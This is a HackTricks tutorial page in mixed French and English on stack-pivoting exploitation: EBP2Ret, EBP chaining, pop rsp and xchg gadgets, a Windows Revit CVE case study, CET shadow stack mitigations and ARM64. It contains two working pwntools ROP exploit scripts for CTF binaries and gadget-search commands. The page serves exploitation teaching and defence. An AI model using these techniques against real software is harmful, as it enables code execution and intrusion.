# Stack Pivoting - EBP2Ret - EBP chaining

{{#include ../../banners/hacktricks-training.md}}

## Informations de base

Cette technique exploite la possibilité de manipuler le **Base Pointer (EBP/RBP)** pour enchaîner l'exécution de plusieurs fonctions grâce à l'utilisation soignée du pointeur de trame et de la séquence d'instructions **`leave; ret`**.

Pour rappel, sur x86/x86-64 **`leave`** est équivalent à:
```
mov       rsp, rbp   ; mov esp, ebp on x86
pop       rbp        ; pop ebp on x86
ret
```
Et comme le **EBP/RBP sauvegardé est dans la stack** avant l'EIP/RIP sauvegardé, il est possible de le contrôler en contrôlant la stack.

> Notes
> - On 64-bit, replace EBP→RBP and ESP→RSP. Semantics are the same.
> - Some compilers omit the frame pointer (see “EBP might not be used”). In that case, `leave` might not appear and this technique won’t work.

### EBP2Ret

Cette technique est particulièrement utile lorsque vous pouvez **modifier l'EBP/RBP sauvegardé mais n'avez aucun moyen direct de changer l'EIP/RIP**. Elle exploite le comportement de l'épilogue de fonction.

If, during `fvuln`'s execution, you manage to inject a **fake EBP** in the stack that points to an area in memory where your shellcode/ROP chain address is located (plus 8 bytes on amd64 / 4 bytes on x86 to account for the `pop`), you can indirectly control RIP. As the function returns, `leave` sets RSP to the crafted location and the subsequent `pop rbp` decreases RSP, **effectively making it point to an address stored by the attacker there**. Then `ret` will use that address.

Note how you **need to know 2 addresses**: the address where ESP/RSP is going to go, and the value stored at that address that `ret` will consume.

#### Exploit Construction

First you need to know an **address where you can write arbitrary data/addresses**. RSP will point here and **consume the first `ret`**.

Then, you need to choose the address used by `ret` that will **transfer execution**. You could use:

- A valid [**ONE_GADGET**](https://github.com/david942j/one_gadget) address.
- The address of **`system()`** followed by the appropriate return and arguments (on x86: `ret` target = `&system`, then 4 junk bytes, then `&"/bin/sh"`).
- The address of a **`jmp esp;`** gadget ([**ret2esp**](../rop-return-oriented-programing/ret2esp-ret2reg.md)) followed by inline shellcode.
- A [**ROP**](../rop-return-oriented-programing/index.html) chain staged in writable memory.

Remember that before any of these addresses in the controlled area, there must be **space for the `pop ebp/rbp`** from `leave` (8B on amd64, 4B on x86). You can abuse these bytes to set a **second fake EBP** and keep control after the first call returns.

#### Off-By-One Exploit

There's a variant used when you can **only modify the least significant byte of the saved EBP/RBP**. In such a case, the memory location storing the address to jump to with **`ret`** must share the first three/five bytes with the original EBP/RBP so a 1-byte overwrite can redirect it. Usually the low byte (offset 0x00) is increased to jump as far as possible within a nearby page/aligned region.

It’s also common to use a RET sled in the stack and put the real ROP chain at the end to make it more probable that the new RSP points inside the sled and the final ROP chain is executed.

### EBP Chaining

By placing a controlled address in the saved `EBP` slot of the stack and a `leave; ret` gadget in `EIP/RIP`, it's possible to **move `ESP/RSP` to an attacker-controlled address**.

Now `RSP` is controlled and the next instruction is `ret`. Place in the controlled memory something like:

- `&(next fake EBP)` -> Loaded by `pop ebp/rbp` from `leave`.
- `&system()` -> Called by `ret`.
- `&(leave;ret)` -> After `system` ends, moves RSP to the next fake EBP and continues.
- `&("/bin/sh")` -> Argument for `system`.

This way it's possible to chain several fake EBPs to control the flow of the program.

This is like a [ret2lib](../rop-return-oriented-programing/ret2lib/index.html), but more complex and only useful in edge-cases.

Moreover, here you have an [**example of a challenge**](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/leave) that uses this technique with a **stack leak** to call a winning function. This is the final payload from the page:
```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

p.recvuntil('to: ')
buffer = int(p.recvline(), 16)
log.success(f'Buffer: {hex(buffer)}')

LEAVE_RET = 0x40117c
POP_RDI = 0x40122b
POP_RSI_R15 = 0x401229

payload = flat(
0x0,               # rbp (could be the address of another fake RBP)
POP_RDI,
0xdeadbeef,
POP_RSI_R15,
0xdeadc0de,
0x0,
elf.sym['winner']
)

payload = payload.ljust(96, b'A')     # pad to 96 (reach saved RBP)

payload += flat(
buffer,         # Load leaked address in RBP
LEAVE_RET       # Use leave to move RSP to the user ROP chain and ret to execute it
)

pause()
p.sendline(payload)
print(p.recvline())
```
> astuce d'alignement amd64 : System V ABI requires 16-byte stack alignment at call sites. Si votre chaîne appelle des fonctions comme `system`, ajoutez un alignment gadget (par ex., `ret`, ou `sub rsp, 8 ; ret`) avant l'appel pour maintenir l'alignement et éviter les plantages `movaps`.

## EBP pourrait ne pas être utilisé

As [**explained in this post**](https://github.com/florianhofhammer/stack-buffer-overflow-internship/blob/master/NOTES.md#off-by-one-1), si un binaire est compilé avec certaines optimisations ou avec frame-pointer omission, le **EBP/RBP ne contrôle jamais ESP/RSP**. Par conséquent, tout exploit reposant sur le contrôle de EBP/RBP échouera car le prologue/épilogue ne restaure pas depuis le frame pointer.

- Non optimisé / frame pointer utilisé:
```bash
push   %ebp         # save ebp
mov    %esp,%ebp    # set new ebp
sub    $0x100,%esp  # increase stack size
.
.
.
leave               # restore ebp (leave == mov %ebp, %esp; pop %ebp)
ret                 # return
```
- Optimisé / pointeur de trame omis :
```bash
push   %ebx         # save callee-saved register
sub    $0x100,%esp  # increase stack size
.
.
.
add    $0x10c,%esp  # reduce stack size
pop    %ebx         # restore
ret                 # return
```
Sur amd64, vous verrez souvent `pop rbp ; ret` au lieu de `leave ; ret`, mais si le pointeur de trame est entièrement omis il n'y a alors aucun épilogue basé sur `rbp` par lequel pivoter.

## Other ways to control RSP

### `pop rsp` gadget

[**In this page**](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/pop-rsp) vous pouvez trouver un exemple utilisant cette technique. Pour ce challenge, il a été nécessaire d'appeler une fonction avec 2 arguments spécifiques, il y avait un **`pop rsp` gadget** et il y a un **leak depuis la pile**:
```python
# Code from https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/pop-rsp
# This version has added comments

from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

p.recvuntil('to: ')
buffer = int(p.recvline(), 16) # Leak from the stack indicating where is the input of the user
log.success(f'Buffer: {hex(buffer)}')

POP_CHAIN = 0x401225       # pop all of: RSP, R13, R14, R15, ret
POP_RDI = 0x40122b
POP_RSI_R15 = 0x401229     # pop RSI and R15

# The payload starts
payload = flat(
0,                 # r13
0,                 # r14
0,                 # r15
POP_RDI,
0xdeadbeef,
POP_RSI_R15,
0xdeadc0de,
0x0,               # r15
elf.sym['winner']
)

payload = payload.ljust(104, b'A')     # pad to 104

# Start popping RSP, this moves the stack to the leaked address and
# continues the ROP chain in the prepared payload
payload += flat(
POP_CHAIN,
buffer             # rsp
)

pause()
p.sendline(payload)
print(p.recvline())
```
### xchg <reg>, rsp gadget
```
pop <reg>                <=== return pointer
<reg value>
xchg <reg>, rsp
```
### jmp esp

Consultez la technique ret2esp ici :


{{#ref}}
../rop-return-oriented-programing/ret2esp-ret2reg.md
{{#endref}}

### Trouver rapidement des pivot gadgets

Utilisez votre gadget finder préféré pour rechercher des pivot primitives classiques :

- `leave ; ret` dans des fonctions ou des bibliothèques
- `pop rsp` / `xchg rax, rsp ; ret`
- `add rsp, <imm> ; ret` (ou `add esp, <imm> ; ret` sur x86)

Exemples :
```bash
# Ropper
ropper --file ./vuln --search "leave; ret"
ropper --file ./vuln --search "pop rsp"
ropper --file ./vuln --search "xchg rax, rsp ; ret"

# ROPgadget
ROPgadget --binary ./vuln --only "leave|xchg|pop rsp|add rsp"
```
### Schéma classique de pivot staging

Une stratégie de pivot robuste utilisée dans de nombreux CTFs/exploits :

1) Utiliser un petit overflow initial pour appeler `read`/`recv` dans une grande région writable (par ex., `.bss`, heap, ou mémoire mappée RW) et y placer une ROP chain complète.  
2) Faire retourner vers un pivot gadget (`leave ; ret`, `pop rsp`, `xchg rax, rsp ; ret`) pour déplacer RSP vers cette région.  
3) Continuer avec la staged chain (par ex., leak libc, appeler `mprotect`, puis `read` le shellcode, puis sauter vers celui-ci).

### Windows : Destructor-loop weird-machine pivots (étude de cas Revit RFA)

Les parseurs client-side implémentent parfois des destructor loops qui appellent indirectement un pointeur de fonction dérivé de champs d'objet contrôlés par l'attaquant. Si chaque itération offre exactement un appel indirect (une “one-gadget” machine), vous pouvez convertir cela en un stack pivot fiable et en une entrée ROP.

Observé dans Autodesk Revit RFA deserialization (CVE-2025-5037) :

- Des objets crafted de type `AString` placent un pointeur vers des bytes contrôlés par l'attaquant à l'offset 0.  
- La destructor loop exécute effectivement un gadget par objet :
```asm
rcx = [rbx]              ; object pointer (AString*)
rax = [rcx]              ; pointer to controlled buffer
call qword ptr [rax]     ; execute [rax] once per object
```
Deux pivots pratiques :

- Windows 10 (32-bit heap addrs) : misaligned “monster gadget” contenant `8B E0` → `mov esp, eax`, puis `ret`, pour pivoter depuis le call primitive vers un heap-based ROP chain.
- Windows 11 (full 64-bit addrs) : utiliser deux objets pour piloter un constrained weird-machine pivot :
- Gadget 1: `push rax ; pop rbp ; ret` (déplace le rax original dans rbp)
- Gadget 2: `leave ; ... ; ret` (devient `mov rsp, rbp ; pop rbp ; ret`), pivotant dans le buffer du premier objet, où suit une ROP chain conventionnelle.

Conseils pour Windows x64 après le pivot :

- Respectez le shadow space de 0x20 octets et maintenez un alignement sur 16 octets avant les sites `call`. Il est souvent pratique de placer les littéraux au‑dessus de l'adresse de retour et d'utiliser un gadget comme `lea rcx, [rsp+0x20] ; call rax` suivi de `pop rax ; ret` pour passer des adresses de pile sans corrompre le flux de contrôle.
- Les modules helper non‑ASLR (si présents) fournissent des pools de gadgets stables et des imports tels que `LoadLibraryW`/`GetProcAddress` pour résoudre dynamiquement des cibles comme `ucrtbase!system`.
- Créer des gadgets manquants via un writable thunk : si une séquence prometteuse se termine par un `call` via un writable function pointer (p.ex., DLL import thunk ou function pointer dans .data), écrasez ce pointeur avec un gadget bénin comme `pop rax ; ret`. La séquence se comporte alors comme si elle se terminait par `ret` (p.ex. `mov rdx, rsi ; mov rcx, rdi ; ret`), ce qui est inestimable pour charger les registres d'arguments Windows x64 sans écraser les autres.

Pour la construction complète de la chaîne et des exemples de gadgets, voir la référence ci‑dessous.

## Modern mitigations that break stack pivoting (CET/Shadow Stack)

Les CPU x86 et OS modernes déploient de plus en plus **CET Shadow Stack (SHSTK)**. Avec SHSTK activé, le `ret` compare l'adresse de retour sur la pile normale avec une shadow stack protégée par le matériel ; toute discordance déclenche une Control-Protection fault et termine le processus. Par conséquent, des techniques comme les pivots basés sur EBP2Ret/leave;ret planteront dès que le premier `ret` sera exécuté depuis une pile pivotée.

- For background and deeper details see:


{{#ref}}
../common-binary-protections-and-bypasses/cet-and-shadow-stack.md
{{#endref}}

- Vérifications rapides sur Linux :
```bash
# 1) Is the binary/toolchain CET-marked?
readelf -n ./binary | grep -E 'x86.*(SHSTK|IBT)'

# 2) Is the CPU/kernel capable?
grep -E 'user_shstk|ibt' /proc/cpuinfo

# 3) Is SHSTK active for this process?
grep -E 'x86_Thread_features' /proc/$$/status   # expect: shstk (and possibly wrss)

# 4) In pwndbg (gdb), checksec shows SHSTK/IBT flags
(gdb) checksec
```
- Notes pour les labs/CTF :
- Certaines distributions modernes activent SHSTK pour les binaires compatibles CET lorsque le matériel et glibc le prennent en charge. Pour des tests contrôlés dans des VM, SHSTK peut être désactivé au niveau système via le paramètre de boot du noyau `nousershstk`, ou activé sélectivement via des tunables glibc au démarrage (voir les références). Ne désactivez pas les mitigations sur des cibles en production.
- Les techniques basées sur JOP/COOP ou SROP peuvent toujours être viables sur certaines cibles, mais SHSTK casse spécifiquement les pivots basés sur `ret`.

- Note Windows : Windows 10+ expose la protection côté utilisateur et Windows 11 ajoute en mode noyau la “Hardware-enforced Stack Protection” basée sur des shadow stacks. Les processus compatibles CET empêchent le stack pivoting/ROP au `ret` ; les développeurs s'inscrivent via CETCOMPAT et des politiques associées (voir référence).

## ARM64

En ARM64, les **prologues et épilogues** des fonctions **n'enregistrent pas et ne restaurent pas le registre SP** sur la pile. De plus, l'instruction **`RET`** ne retourne pas à l'adresse pointée par SP, mais **à l'adresse contenue dans `x30`**.

Therefore, by default, just abusing the epilogue you **won't be able to control the SP register** by overwriting some data inside the stack. And even if you manage to control the SP you would still need a way to **control the `x30`** register.

- prologue

```armasm
sub sp, sp, 16
stp x29, x30, [sp]      // [sp] = x29; [sp + 8] = x30
mov x29, sp             // FP points to frame record
```

- epilogue

```armasm
ldp x29, x30, [sp]      // x29 = [sp]; x30 = [sp + 8]
add sp, sp, 16
ret
```

> [!CAUTION]
> La manière d'effectuer quelque chose de similaire au stack pivoting en ARM64 serait de pouvoir **contrôler le `SP`** (en contrôlant un registre dont la valeur est affectée à `SP` ou parce que, pour une raison quelconque, `SP` prend son adresse depuis la pile et que nous disposons d'un overflow) puis **abuser de l'épilogue** pour charger le registre **`x30`** depuis un **`SP` contrôlé** et **`RET`** dessus.

Also in the following page you can see the equivalent of **Ret2esp in ARM64**:


{{#ref}}
../rop-return-oriented-programing/ret2esp-ret2reg.md
{{#endref}}

## Références

- [https://bananamafia.dev/post/binary-rop-stackpivot/](https://bananamafia.dev/post/binary-rop-stackpivot/)
- [https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting)
- [https://guyinatuxedo.github.io/17-stack_pivot/dcquals19_speedrun4/index.html](https://guyinatuxedo.github.io/17-stack_pivot/dcquals19_speedrun4/index.html)
- 64 bits, exploitation off-by-one avec une rop chain commençant par un ret sled
- [https://guyinatuxedo.github.io/17-stack_pivot/insomnihack18_onewrite/index.html](https://guyinatuxedo.github.io/17-stack_pivot/insomnihack18_onewrite/index.html)
- 64 bit, pas de relro, canary, nx ni pie. Le programme fournit un leak pour la stack ou le pie et un WWW d'un qword. D'abord obtenir le leak de la stack et utiliser le WWW pour revenir et obtenir le leak du pie. Ensuite utiliser le WWW pour créer une boucle "éternelle" en abusant des entrées `.fini_array` + en appelant `__libc_csu_fini` ([more info here](../arbitrary-write-2-exec/www2exec-.dtors-and-.fini_array.md)). En abusant de cette écriture "éternelle", on écrit une ROP chain dans le .bss et on finit par l'appeler en pivotant avec RBP.
- Documentation du noyau Linux : Control-flow Enforcement Technology (CET) Shadow Stack — détails sur SHSTK, `nousershstk`, flags `/proc/$PID/status`, et activation via `arch_prctl`. https://www.kernel.org/doc/html/next/x86/shstk.html
- Microsoft Learn : Kernel Mode Hardware-enforced Stack Protection (CET shadow stacks on Windows). https://learn.microsoft.com/en-us/windows-server/security/kernel-mode-hardware-stack-protection
- [Crafting a Full Exploit RCE from a Crash in Autodesk Revit RFA File Parsing (ZDI blog)](https://www.thezdi.com/blog/2025/10/6/crafting-a-full-exploit-rce-from-a-crash-in-autodesk-revit-rfa-file-parsing)

{{#include ../../banners/hacktricks-training.md}}
